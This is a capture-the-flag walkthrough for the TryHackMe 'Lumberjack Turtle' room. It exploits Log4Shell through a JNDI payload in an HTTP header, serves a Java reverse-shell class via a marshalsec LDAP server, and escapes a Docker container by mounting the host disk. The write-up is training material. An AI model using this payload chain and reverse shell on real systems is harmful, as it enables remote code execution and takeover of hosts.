# **Lumberjack Turtle - TryHackMe**

*Target Ip. Address: 10.48.141.102*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.141.102
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 18:23 +0545
Nmap scan report for 10.48.141.102
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE     VERSION
22/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:15:9b:4f:d2:ca:04:bc:4a:c0:aa:81:08:58:7b:56 (RSA)
|   256 ab:85:0a:fb:33:d2:ab:8b:1f:7d:5a:f4:e6:4f:ff:71 (ECDSA)
|_  256 a0:8a:61:4c:ba:23:1b:df:d4:d2:81:16:80:f3:3e:46 (ED25519)
80/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.30 seconds
```

We have 2 open ports. Port 22 (ssh) and Port 80 (http). Let's head to website.

The website tells us to dig more. Let's get into digging with gobuster.

```bash
kali@kali:gobuster dir -u http://10.48.141.102/ -w /usr/share/wordlists/dirb/big.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.141.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
error                (Status: 500) [Size: 73]
~logs                (Status: 200) [Size: 29]
Progress: 40938 / 40938 (100.00%)
===============================================================
Finished
===============================================================
```

We have 1 hit, heading to it will again prompt us to enumerate more.

```bash
kali@kali:gobuster dir -u http://10.48.141.102/~logs -w /usr/share/wordlists/dirb/big.txt -x php
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.141.102/~logs
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
log4j                (Status: 200) [Size: 47]
Progress: 40938 / 40938 (100.00%)
===============================================================
Finished
===============================================================
```

We have log4j. While inspecting, we see the hint to use CVE-2021-44228 against X-Api-Version.

CVE-2021-44228 is Apache-Log4j-RCE vulnerability. We can do a quick test.

Start a listener.

```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
```

Send a request using the vulnerablr header.

```bash
kali@kali:curl -L -i 'http://10.48.141.102/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.130.26:4444}'
```
```bash
kali@kali:nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.130.26] from (UNKNOWN) [10.48.141.102] 39418
0
 `
```

We receive a connection back. Thus we can exploit this to get a RCE.

First we have to create a ldap server.

```bash
kali@kali:git clone https://github.com/mbechler/marshalsec
Cloning into 'marshalsec'...
remote: Enumerating objects: 186, done.
remote: Counting objects: 100% (43/43), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 186 (delta 35), reused 28 (delta 28), pack-reused 143 (from 3)
Receiving objects: 100% (186/186), 481.95 KiB | 1.06 MiB/s, done.
Resolving deltas: 100% (91/91), done.
```

Build the project.

```bash
kali@kali:mvn clean package -DskipTests
[INFO] Scanning for projects...
[INFO]
[INFO] ----------------< org.eenterphace.mbechler:marshalsec >-----------------
[INFO] Building marshalsec 0.0.3-SNAPSHOT
[INFO]   from pom.xml
.
.
.
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  02:29 min
[INFO] Finished at: 2026-02-23T18:48:09+05:45
[INFO] ------------------------------------------------------------------------
```

The build was successful, now we can run the server. The server will redirect the connection to port 8000, where we will host a python server with our exploit payload.

```bash
kali@kali:java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.130.26:8000/#Exploit"
Listening on 0.0.0.0:1389
```                     

Now, from another terminal create a java reverse shell exploit.

```bash
kali@kali:cat Exploit.java 
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    String host="192.168.130.26";
    int port=4444;
    String cmd="/bin/sh";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s=new Socket(host,port);
    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
    while(!s.isClosed()) {
      while(pi.available()>0)
        so.write(pi.read());
      while(pe.available()>0)
        so.write(pe.read());
      while(si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      }
      catch (Exception e){
      }
    };
    p.destroy();
    s.close();
  }
} 
```

Compile the project.

```bash
kali@kali:javac Exploit.java -source 8 -target 8
warning: [options] bootstrap class path not set in conjunction with -source 8
warning: [options] source value 8 is obsolete and will be removed in a future release
warning: [options] target value 8 is obsolete and will be removed in a future release
warning: [options] To suppress warnings about obsolete options, use -Xlint:-options.
4 warnings

kali@kali:ls
Exploit.class  Exploit.java  LICENSE.txt  marshalsec.pdf  pom.xml  README.md  src  target
```

Let's start the python server and a listener.

```bash
kali@kali:python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.66 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Let's send the request to our ldap server with vulnerable header.

```bash
kali@kali:curl  -L -i 'http://10.48.141.102/~logs/log4j' -H 'X-Api-Version: ${jndi:ldap://192.168.130.26:1389/Exploit}'
```

This will send a request to our ldap server. Our ldap server will redirect it to our python server, where our exploit paylod is hosted.

```bash
kali@kali:java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.130.26:8000/#Exploit"
Listening on 0.0.0.0:1389
Send LDAP reference result for Exploit redirecting to http://192.168.130.26:8000/Exploit.class
```

If everthing goes well, should receive a reverse shell shortly.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.66 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 81fbbf1def70~10.48.141.102-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 192.168.130.26:4444
[+] Got reverse shell from 81fbbf1def70~10.48.141.102-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/81fbbf1def70~10.48.141.102-Linux-x86_64/2026_02_23-18_51_57-646.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

We get a reverse shell as root, but we are in docker container.

```bash
bash-4.4# cat .flag1
THM{LO.....TW}
```

We find our first flag at /opt directory.

```bash
bash-4.4# fdisk -l
Disk /dev/nvme0n1: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: dos
Disk identifier: 0x3650a2cc

Device         Boot Start      End  Sectors Size Id Type
/dev/nvme0n1p1 *     2048 83886046 83883999  40G 83 Linux


Disk /dev/nvme1n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes


Disk /dev/nvme2n1: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
```

The presence of a bootable primary partition (/dev/nvme0n1p1) on a system where the user has root-level shell access (bash-4.4#) suggests a high risk of unrestricted data access or persistence, as the lack of encryption (like LUKS) on this partition would allow an attacker to modify system binaries or extract sensitive configuration files directly.

Let's mount that disk.

```bash
bash-4.4# mkdir -p /mnt/exploit

bash-4.4# mount /dev/nvme0n1p1 /mnt/exploit
```

That was succes. Now, we can access it.

```bash
bash-4.4# cd /mnt/exploit

bash-4.4# ls
bin             etc             initrd.img.old  lost+found      opt             run             sys             var
boot            home            lib             media           proc            sbin            tmp             vmlinuz
dev             initrd.img      lib64           mnt             root            srv             usr             vmlinuz.old
```

Let's read the final flag at root directory. Note: Don't use /root, use only root while changing directory. Using /root will lead us to root directory of docker container not this mounted drive.

```bash
bash-4.4# cat root.txt
Pffft. Come on. Look harder.
```

Oh! So, we have to search the flag.

```bash
bash-4.4# ls -la
total 36
drwx------    5 root     root          4096 Jun  5  2025 .
drwxr-xr-x   22 root     root          4096 Feb 23 12:36 ..
drwxr-xr-x    2 root     root          4096 Dec 13  2021 ...
-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc
drwx------    2 root     root          4096 May 24  2025 .cache
-rw-r--r--    1 root     root           161 Jan  2  2024 .profile
drwx------    2 root     root          4096 Dec 13  2021 .ssh
-rw-------    1 root     root           966 Jun  5  2025 .viminfo
-r--------    1 root     root            29 Dec 13  2021 root.txt
```

See, something unusual. There is '...' which is not a default one, it is a directory.

```bash
bash-4.4# cd ...

bash-4.4# ls -la
total 12
drwxr-xr-x    2 root     root          4096 Dec 13  2021 .
drwx------    5 root     root          4096 Jun  5  2025 ..
-r--------    1 root     root            26 Dec 13  2021 ._fLaG2
```

We have our final flag there. Let's end this challenge.

```bash
bash-4.4# cat ._fLaG2 
THM{C0.....TW}
```


